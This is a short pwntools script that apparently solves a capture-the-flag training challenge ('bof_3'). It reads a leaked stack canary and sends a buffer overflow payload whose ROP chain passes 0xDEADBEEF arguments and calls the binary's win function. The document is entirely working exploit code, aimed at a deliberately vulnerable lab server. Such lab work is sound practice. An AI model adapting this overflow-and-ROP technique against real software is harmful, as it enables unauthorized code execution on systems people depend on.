#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-bof3-8955ef3909a7.training.bksec.vn"
elf = context.binary = ELF('./bof_3', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x000000000040137E
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

p.recvuntil(b'canary is: ')
canary = int(p.recvline().strip(), 16)
log.info(f'canary: {hex(canary)}')

pl = b'A'*0x58 + p64(canary) + b'B'*8
pl += flat(
    0x00401205+1,
    0x00401205, 0xDEADBEEFDEADBEEF,
    0x0040120e, 0xDEADBEEFDEADBEEF,
    p64(elf.sym.win)
    )
# GDB()
sla(b'number: ', pl)

p.interactive()